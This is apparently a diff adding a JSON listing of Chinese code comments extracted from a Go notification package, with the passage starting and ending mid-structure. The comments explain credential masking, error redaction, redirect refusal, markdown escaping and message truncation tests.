+    "path": "source/notify/mask_test.go",
+    "Start": 4277,
+    "End": 4382,
+    "Line": 121,
+    "Text": "// 而不是「防御逻辑的正确输入」——只测后者的话，防御没生效也照样全绿。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 4560,
+    "End": 4608,
+    "Line": 128,
+    "Text": "// wantMissing 是预期被点名的凭据键。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 5941,
+    "End": 6028,
+    "Line": 163,
+    "Text": "// 掩码值 = 「沿用旧凭据」，在地址变更的语境下同样必须拒绝。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 7370,
+    "End": 7418,
+    "Line": 197,
+    "Text": "// 错误信息要能指导操作者怎么修。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 7556,
+    "End": 7652,
+    "Line": 205,
+    "Text": "// TestPrepareConfigUpdateAllowsLegitimateEdits 反向用例：正常的编辑不能被误拦，"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 7653,
+    "End": 7719,
+    "Line": 206,
+    "Text": "// 否则这个防护会因为「太烦」而被绕过或删掉。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 9871,
+    "End": 9951,
+    "Line": 264,
+    "Text": "// TestPrepareConfigUpdatePortTypeTolerance 覆盖一个容易误判的细节："
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 9952,
+    "End": 10039,
+    "Line": 265,
+    "Text": "// 前端提交的端口是 JSON number（float64），库里读回来也是 float64，"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 10040,
+    "End": 10155,
+    "Line": 266,
+    "Text": "// 但两个值的类型可能不同（如 int vs float64）。用 == 比较会把「没改」判成「改了」，"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 10156,
+    "End": 10276,
+    "Line": 267,
+    "Text": "// 从而对只改了名字的用户弹出「请重新填写密码」——假警报会让人不再信任这个防护。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 10431,
+    "End": 10475,
+    "Line": 270,
+    "Text": "// 同一个端口，以 int 形式提交。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 10663,
+    "End": 10699,
+    "Line": 274,
+    "Text": "// 真的换了端口则必须拦。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 10839,
+    "End": 10927,
+    "Line": 280,
+    "Text": "// TestPrepareConfigUpdateSurvivesRepeatedSaveWithBlankDestination 覆盖「可留空的"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 10928,
+    "End": 11021,
+    "Line": 281,
+    "Text": "// 目的地字段」这条路径：Telegram 的 base_url 留空表示用官方 API 地址。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11025,
+    "End": 11094,
+    "Line": 283,
+    "Text": "// 曾经这里会让渠道从第二次保存起永久保存失败："
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11098,
+    "End": 11204,
+    "Line": 285,
+    "Text": "//\t新建时库里存下 base_url:\"\"（创建路径直接存前端提交的 config，不走 MergeConfig）"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11205,
+    "End": 11285,
+    "Line": 286,
+    "Text": "//\t→ 第一次保存，MergeConfig 把空串当显式清空、delete 掉该键"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11286,
+    "End": 11394,
+    "Line": 287,
+    "Text": "//\t→ 第二次保存，incoming 仍是 \"\"、而 stored 里已经没这个键，被判成「地址变了」"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11395,
+    "End": 11501,
+    "Line": 288,
+    "Text": "//\t→ bot_token 是掩码回显值 → 400「目标地址已变更，请同时重新填写凭据字段」"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11505,
+    "End": 11596,
+    "Line": 290,
+    "Text": "// 用户什么都没改，却从此再也存不上，除非重新粘贴一遍 Bot Token。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11769,
+    "End": 11868,
+    "Line": 294,
+    "Text": "// 前端 buildConfig() 对该渠道的每个字段定义都提交一个值：凭据回填掩码，"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 11870,
+    "End": 11972,
+    "Line": 295,
+    "Text": "// 空文本框提交空串。这里完整复现它的输出，而不是只提交「改动的键」。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 12126,
+    "End": 12193,
+    "Line": 304,
+    "Text": "// 第一次保存：只改了渠道名字，config 原样回传。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 12496,
+    "End": 12577,
+    "Line": 313,
+    "Text": "// 第二次保存：提交内容与上次完全一致，用户什么都没改。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 12743,
+    "End": 12812,
+    "Line": 318,
+    "Text": "// 第三次，确认不是「只错一次」而是稳定可保存。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 12946,
+    "End": 13018,
+    "Line": 322,
+    "Text": "// 凭据必须一路保留下来，没有被空串逻辑连带清掉。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 13134,
+    "End": 13222,
+    "Line": 328,
+    "Text": "// TestPrepareConfigUpdateStillGuardsBlankDestinationChanges 是上一条用例的配对"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 13223,
+    "End": 13326,
+    "Line": 329,
+    "Text": "// 断言：把空串与「键不存在」视为等价，**不能**连带放过真正的地址变更。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 13327,
+    "End": 13430,
+    "Line": 330,
+    "Text": "// 这两个方向都是真实的凭据外发路径——Telegram 的 Bot Token 走在 URL 路径里，"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 13431,
+    "End": 13487,
+    "Line": 331,
+    "Text": "// 换了 base_url 就等于把 Token 送给新地址。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 13568,
+    "End": 13634,
+    "Line": 333,
+    "Text": "// 方向一：从「空」（官方地址）换到自建地址。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 13967,
+    "End": 14051,
+    "Line": 342,
+    "Text": "// 方向二：把自建地址清空（= 换回官方 API）同样是地址变更。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 14470,
+    "End": 14574,
+    "Line": 353,
+    "Text": "// 与 SecretKeys 同理：渠道若忘记声明目的地键，PrepareConfigUpdate 就保护不到它。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 14899,
+    "End": 15003,
+    "Line": 365,
+    "Text": "// 编译器已经强制每个渠道实现 SecretKeys，这里再确认一遍「没有渠道在掩码上"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 15005,
+    "End": 15101,
+    "Line": 366,
+    "Text": "// 交白卷」——返回空切片的渠道意味着它的凭据会明文回显到浏览器。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 15513,
+    "End": 15600,
+    "Line": 382,
+    "Text": "// TestPrepareConfigUpdateRejectsMaskedInContainer 覆盖审计指出的一处口子："
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 15601,
+    "End": 15691,
+    "Line": 383,
+    "Text": "// 把掩码哨兵塞进**非字符串**结构（如 webhook.headers 是个对象）时，"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 15692,
+    "End": 15793,
+    "Line": 384,
+    "Text": "// MergeConfig 只认「字符串且带前缀」为掩码，于是字面量 \"__masked__\" 会被当成"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 15794,
+    "End": 15875,
+    "Line": 385,
+    "Text": "// 真实头值存进库——后续鉴权静默失效，且没有任何报错。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 16084,
+    "End": 16120,
+    "Line": 391,
+    "Text": "// 对象内部夹带掩码哨兵。"
+  },
+  {
+    "path": "source/notify/mask_test.go",
+    "Start": 16391,
+    "End": 16445,
+    "Line": 398,
+    "Text": "// 整体提交对象（真实新值）照常接受。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 66,
+    "End": 181,
+    "Line": 9,
+    "Text": "// 本文件覆盖「按整条打包」这个修复：汇总消息超出渠道长度上限时，必须**按整条**"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 182,
+    "End": 281,
+    "Line": 10,
+    "Text": "// 截断并把没装下的条目数如实报出来，让调用方只标记真正送达的那些。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 285,
+    "End": 393,
+    "Line": 12,
+    "Text": "// 之前的做法是渲染完整篇再截断、然后整批标记已送达：消息后半截凭空消失，"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 394,
+    "End": 493,
+    "Line": 13,
+    "Text": "// 而投递历史显示全部成功——漏洞就这么没了，且没有任何地方能发现。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 564,
+    "End": 622,
+    "Line": 16,
+    "Text": "// 200 条中文汇总，必然远超企微 4096 字节。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 1011,
+    "End": 1113,
+    "Line": 29,
+    "Text": "// 头部必须如实说明本条只包含多少条、其余有多少条——否则读者会把头部"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 1115,
+    "End": 1145,
+    "Line": 30,
+    "Text": "// 那个数字当成全部。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 1357,
+    "End": 1387,
+    "Line": 34,
+    "Text": "// 只应包含前 kept 条。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 1784,
+    "End": 1800,
+    "Line": 47,
+    "Text": "// 0 = 不限制"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 2079,
+    "End": 2169,
+    "Line": 57,
+    "Text": "// 预算小到连一条都装不下时，仍要发出一条（由最终截断兜底）。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 2171,
+    "End": 2276,
+    "Line": 58,
+    "Text": "// 否则一条超长漏洞会把整批永久卡在原地：每次领取都装不下、每次都不发。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 2584,
+    "End": 2623,
+    "Line": 71,
+    "Text": "// 空消息没有可送达的条目。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 2840,
+    "End": 2931,
+    "Line": 80,
+    "Text": "// Telegram 按**字符数**限长；用字节口径会把中文消息压到三分之一。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 3550,
+    "End": 3607,
+    "Line": 101,
+    "Text": "// 这两个渠道不截断正文，整批都算送达。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 3697,
+    "End": 3785,
+    "Line": 106,
+    "Text": "// 通过渲染器的返回值间接确认：markdownBody(0) 不限制时全部保留。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 3904,
+    "End": 4009,
+    "Line": 112,
+    "Text": "// TestMarkdownEscapesUntrustedContent 是「不可信内容不得改变消息结构」的回归测试。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 4010,
+    "End": 4125,
+    "Line": 113,
+    "Text": "// 标题与摘要来自模型输出（模型读的是被测目标响应），资产名来自被测目标的 URL。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 4249,
+    "End": 4291,
+    "Line": 118,
+    "Text": "// 结果里必须出现（转义形态）"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 4309,
+    "End": 4354,
+    "Line": 119,
+    "Text": "// 结果里不得出现（未转义形态）"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 4539,
+    "End": 4615,
+    "Line": 127,
+    "Text": "// 换行必须被折叠（否则能伪造出新的列表项/引用块）；"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 4619,
+    "End": 4694,
+    "Line": 128,
+    "Text": "// 方括号与圆括号必须被转义（否则是可点击的外链）。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 5643,
+    "End": 5718,
+    "Line": 165,
+    "Text": "// 单条模式的写Item 是三个 markdown 渠道共用的渲染路径。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 6139,
+    "End": 6226,
+    "Line": 184,
+    "Text": "// TestMarkdownEscapeBackslashFirst 锁住转义顺序：反斜杠必须最先处理，"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 6227,
+    "End": 6311,
+    "Line": 185,
+    "Text": "// 否则会给后面补上的反斜杠再套一层，输出里出现双反斜杠。"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 6477,
+    "End": 6548,
+    "Line": 192,
+    "Text": "// TestTelegramTitleHasNoMarkdownEscapes 锁住一个具体的回归："
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 6549,
+    "End": 6646,
+    "Line": 193,
+    "Text": "// markdown 转义不能泄漏到 Telegram 的 HTML 输出里（曾经在共享的标题函数里"
+  },
+  {
+    "path": "source/notify/pack_test.go",
+    "Start": 6647,
+    "End": 6732,
+    "Line": 194,
+    "Text": "// 加过转义，结果 Telegram 消息里出现 `\\(1\\)` 这种可见反斜杠）。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 128,
+    "End": 237,
+    "Line": 15,
+    "Text": "// 本文件是不变量测试：**任何**从渠道实现里冒出来的错误文本都不得携带凭据。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 241,
+    "End": 346,
+    "Line": 17,
+    "Text": "// 为什么单独拉一个文件：最初的渠道用例只覆盖了成功路径与平台业务错误，"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 347,
+    "End": 458,
+    "Line": 18,
+    "Text": "// 完全没看传输层失败。而恰恰是传输层错误（连接被拒/DNS 失败/超时）最危险——"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 459,
+    "End": 552,
+    "Line": 19,
+    "Text": "// http.Client.Do 返回的 *url.Error 会把**完整 URL** 打进错误文本，而本功能"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 553,
+    "End": 636,
+    "Line": 20,
+    "Text": "// 这几家的凭据就在 URL 里。凭据顺着这条串流到了四个出口："
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 640,
+    "End": 695,
+    "Line": 22,
+    "Text": "//\tnotification_deliveries.last_error  → 明文落库"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 696,
+    "End": 789,
+    "Line": 23,
+    "Text": "//\tGET /api/notify/deliveries 响应     → 绕过渠道配置的掩码，回显给浏览器"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 790,
+    "End": 856,
+    "Line": 24,
+    "Text": "//\t服务端日志                          → 常被外发留存"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 857,
+    "End": 927,
+    "Line": 25,
+    "Text": "//\t测试发送接口的 502 响应             → 直接弹在前端"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 931,
+    "End": 1042,
+    "Line": 27,
+    "Text": "// 所以这里不只测一个函数，而是逐个渠道真发一次必然失败的请求，断言错误文本"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 1043,
+    "End": 1073,
+    "Line": 28,
+    "Text": "// 里找不到那个凭据。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 1075,
+    "End": 1147,
+    "Line": 30,
+    "Text": "// credentialCases 覆盖所有「凭据在 URL 里」的渠道形态："
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 1148,
+    "End": 1227,
+    "Line": 31,
+    "Text": "// 钉钉/企微在 query，飞书在路径末段，Telegram 在路径中段。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 2351,
+    "End": 2453,
+    "Line": 70,
+    "Text": "// leakProbeToken 是一个绝不可能是真实凭据的哨兵值，用于在错误文本里搜它。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 2506,
+    "End": 2568,
+    "Line": 73,
+    "Text": "// TestChannelErrorsNeverLeakCredentials 是核心不变量。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 2707,
+    "End": 2797,
+    "Line": 77,
+    "Text": "// 必然失败的对端：127.0.0.1:1 无人监听，走的是连接被拒这条路径。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 3065,
+    "End": 3148,
+    "Line": 89,
+    "Text": "// TestChannelErrorsNeverLeakCredentialsInPermanentPath 覆盖永久失败分支："
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 3149,
+    "End": 3246,
+    "Line": 90,
+    "Text": "// URL 校验失败、平台业务错误等也会把错误文本外传，同样不能带凭据。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 3399,
+    "End": 3484,
+    "Line": 97,
+    "Text": "// 地址里带凭据但格式非法 → 触发 validateHTTPURL / url.Parse 分支。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 5235,
+    "End": 5311,
+    "Line": 135,
+    "Text": "// 脱敏结果本身不得再含有原地址的任何路径/查询片段。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 5623,
+    "End": 5668,
+    "Line": 144,
+    "Text": "// 不可解析的输入绝不回显原串。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 5889,
+    "End": 5971,
+    "Line": 152,
+    "Text": "// TestRedactTransportErrorStripsURL 直接盯住 *url.Error 这个具体类型："
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 5972,
+    "End": 6045,
+    "Line": 153,
+    "Text": "// 它是 http.Client.Do 的返回类型，也是泄露的第一现场。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 6607,
+    "End": 6668,
+    "Line": 169,
+    "Text": "// Op 也要保留（POST 还是 GET 对排查有意义）。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 6762,
+    "End": 6849,
+    "Line": 175,
+    "Text": "// TestRedactURLsInTextHandlesFallback 兜底路径：非 *url.Error 的自定义错误"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 6850,
+    "End": 6925,
+    "Line": 176,
+    "Text": "// （如重定向策略返回的错误）里的地址同样要被摘掉。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 7284,
+    "End": 7323,
+    "Line": 184,
+    "Text": "// 不含地址的文本原样保留。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 7460,
+    "End": 7563,
+    "Line": 190,
+    "Text": "// TestCrossHostRedirectRefused 覆盖「凭据在 URL 里 + 跟随跨主机跳转 = 交出凭据」。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 7564,
+    "End": 7659,
+    "Line": 191,
+    "Text": "// httptest 的两个服务监听在 127.0.0.1 的不同端口，端口不同即 Host 不同，"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 7660,
+    "End": 7693,
+    "Line": 192,
+    "Text": "// 正好构成跨主机跳转。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 8583,
+    "End": 8689,
+    "Line": 218,
+    "Text": "// TestSameHostRedirectAllowed 反向用例：同主机跳转（如末尾补斜杠）必须仍然可用，"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 8690,
+    "End": 8735,
+    "Line": 219,
+    "Text": "// 否则会把正常工作流一起挡掉。"
+  },
+  {
+    "path": "source/notify/redact_test.go",
+    "Start": 8914,
+    "End": 8950,
+    "Line": 223,
+    "Text": "// 同主机、同端口的跳转。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 79,
+    "End": 183,
+    "Line": 10,
+    "Text": "// TruncateBytes 把 s 截断到不超过 max 字节，保证结果是合法 UTF-8 且不切断字符。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 187,
+    "End": 294,
+    "Line": 12,
+    "Text": "// 为什么必须按字符边界切：企微群机器人的 markdown 有 4096 **字节**硬上限（不是"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 295,
+    "End": 409,
+    "Line": 13,
+    "Text": "// 字符数），而中文一个字 3 字节。直接按字节切片会把一个汉字切成两半，产出非法"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 410,
+    "End": 520,
+    "Line": 14,
+    "Text": "// UTF-8——平台侧要么整条拒收，要么显示成乱码方块。这里的做法是先从预算位置"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 521,
+    "End": 616,
+    "Line": 15,
+    "Text": "// 往前回退到最近的 rune 起始字节（utf8.RuneStart 判定续字节 0b10xxxxxx）。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 620,
+    "End": 713,
+    "Line": 17,
+    "Text": "// max<=0 表示不限制。截断后追加省略号，除非 max 小到装不下省略号。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 877,
+    "End": 966,
+    "Line": 25,
+    "Text": "// max 比省略号还短：放弃省略号，纯截断，避免结果反而超出 max。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1095,
+    "End": 1181,
+    "Line": 36,
+    "Text": "// OneLine 把多行文本压成单行：折叠所有空白，再按字符数截断。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1182,
+    "End": 1286,
+    "Line": 37,
+    "Text": "// 用于 IM 消息的标题行——摘要里常有换行，直接塞进表格/标题会撑坏排版。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1287,
+    "End": 1321,
+    "Line": 38,
+    "Text": "// max<=0 表示不限制长度。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1438,
+    "End": 1541,
+    "Line": 44,
+    "Text": "// TruncateRunes 把 s 截断到不超过 max 个字符（而非字节），超出时追加省略号。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1542,
+    "End": 1570,
+    "Line": 45,
+    "Text": "// max<=0 表示不限制。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1574,
+    "End": 1679,
+    "Line": 47,
+    "Text": "// 与 TruncateBytes 的区别在于平台口径：企微按字节限长，Telegram 按字符数限长。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1680,
+    "End": 1778,
+    "Line": 48,
+    "Text": "// 用错口径不会报错，只会让消息被切得远比预期短（中文 1 字 = 3 字节，"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 1779,
+    "End": 1878,
+    "Line": 49,
+    "Text": "// 按字节切 4096 只剩约 1365 字），所以两个函数都必须保留、按渠道选用。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2104,
+    "End": 2186,
+    "Line": 64,
+    "Text": "// TruncateHTML 按字符数截断 HTML 片段，并保证不产生半截标签。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2190,
+    "End": 2290,
+    "Line": 66,
+    "Text": "// 直接对 HTML 做字符截断会切出 `<a href=\"htt` 这种残缺标签，平台解析器要么"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2291,
+    "End": 2402,
+    "Line": 67,
+    "Text": "// 报错拒收整条、要么把后续正文当成属性值吞掉。这里的做法是：先按字符截断，"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2403,
+    "End": 2473,
+    "Line": 68,
+    "Text": "// 再检查尾部是否有未闭合的 `<`，有就退到它之前。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2477,
+    "End": 2585,
+    "Line": 70,
+    "Text": "// 不做标签配平（补全 </b> 之类）：Telegram 的 HTML 解析器会自动闭合未闭合标签，"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2586,
+    "End": 2700,
+    "Line": 71,
+    "Text": "// 而自己实现配平要处理属性里的引号、注释、自闭合标签，复杂度与收益不成比例。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 2832,
+    "End": 2929,
+    "Line": 77,
+    "Text": "// 尾部若是 `<` 开头的残片（最后出现 `<` 之后没有 `>`），退回 `<` 之前。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3036,
+    "End": 3133,
+    "Line": 81,
+    "Text": "// 尾部若是被切断的 HTML 实体（如 `&amp;` 被切成 `&amp`），同样要退回去。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3135,
+    "End": 3238,
+    "Line": 82,
+    "Text": "// 实体残片在一个只认实体的解析器里可能让**整条消息**被拒收——一条超过"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3240,
+    "End": 3324,
+    "Line": 83,
+    "Text": "// 长度上限的汇总消息本来就常见，不值得为此丢掉整条通知。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3449,
+    "End": 3548,
+    "Line": 90,
+    "Text": "// packItemCount 计算在预算内能**完整**放下多少条，供汇总消息按整条打包。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3552,
+    "End": 3654,
+    "Line": 92,
+    "Text": "// 为什么要按整条而不是渲染完整篇再截断：截断会让后半截条目凭空消失，"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3655,
+    "End": 3772,
+    "Line": 93,
+    "Text": "// 而它们的投递记录仍会被标记为已送达——消息里看不出来、投递历史里也看不出来，"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3773,
+    "End": 3869,
+    "Line": 94,
+    "Text": "// 漏洞就这么没了。按整条打包后，装不下的条目留在库里成为下一批，"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3870,
+    "End": 3939,
+    "Line": 95,
+    "Text": "// 调用方拿到的 kept 就是本条消息真正送达的条数。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 3943,
+    "End": 4032,
+    "Line": 97,
+    "Text": "// 参数：maxSize<=0 表示不限制；reserve 是给消息头部/尾部预留的量；"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4033,
+    "End": 4132,
+    "Line": 98,
+    "Text": "// size 负责计量（各平台口径不同：企微/钉钉按字节，Telegram 按字符数——"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4133,
+    "End": 4214,
+    "Line": 99,
+    "Text": "// 用错口径不会报错，只会让中文消息被压到远小于上限）；"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4215,
+    "End": 4314,
+    "Line": 100,
+    "Text": "// render 把第 idx 条渲染成它的实际文本——长度因内容而异，不能靠估算。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4318,
+    "End": 4422,
+    "Line": 102,
+    "Text": "// 至少返回 1（只要还有条目）。单条极端超长时也要发出这一条、由调用方的"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4423,
+    "End": 4504,
+    "Line": 103,
+    "Text": "// 最终截断兜底，否则一条超长漏洞会把整批永久卡在原地。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4894,
+    "End": 4986,
+    "Line": 122,
+    "Text": "// byteSize / runeSize 是 packItemCount 的两种计量口径，命名出来避免调用处"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 4987,
+    "End": 5079,
+    "Line": 123,
+    "Text": "// 出现裸的 func(s string) int 闭包，否则很难一眼看出用的是哪种口径。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 5192,
+    "End": 5299,
+    "Line": 127,
+    "Text": "// assetLine 把资产列表渲染成一行展示文本，超过 limit 个时省略其余并标注总数。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 5300,
+    "End": 5375,
+    "Line": 128,
+    "Text": "// 一个漏洞可能锚定几十个资产，全列出来会挤爆消息。"
+  },
+  {
+    "path": "source/notify/render.go",
+    "Start": 5631,
+    "End": 5731,
+    "Line": 139,
+    "Text": "// itoa 是 strconv.Itoa 的短别名，仅用于拼接展示文本，避免到处 import strconv。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 120,
+    "End": 215,
+    "Line": 10,
+    "Text": "// 这是本包最要紧的一条不变量。企微按**字节**限长，中文 3 字节/字，"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 217,
+    "End": 320,
+    "Line": 11,
+    "Text": "// 任何按字节硬切的实现都会把汉字切成半个，产出非法 UTF-8 而被平台拒收。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 322,
+    "End": 400,
+    "Line": 12,
+    "Text": "// 用长度互质的多种中英混排输入去撞每一个可能的切点。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 524,
+    "End": 559,
+    "Line": 17,
+    "Text": "// 4 字节 emoji，切错更明显"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 919,
+    "End": 958,
+    "Line": 29,
+    "Text": "// 未被截断时不得改动内容。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 1423,
+    "End": 1505,
+    "Line": 48,
+    "Text": "// max 小于省略号本身时，不能因为追加省略号而反过来超限。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 1631,
+    "End": 1664,
+    "Line": 53,
+    "Text": "// 正常情况应带省略号。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 1862,
+    "End": 1940,
+    "Line": 60,
+    "Text": "// 与 TruncateBytes 的口径差异必须保留：Telegram 按字符限长，"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 1942,
+    "End": 2005,
+    "Line": 61,
+    "Text": "// 用字节口径会把中文消息切到只剩三分之一。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 2186,
+    "End": 2240,
+    "Line": 67,
+    "Text": "// 同样的字符串按字节口径应明显更短。"
+  },
+  {
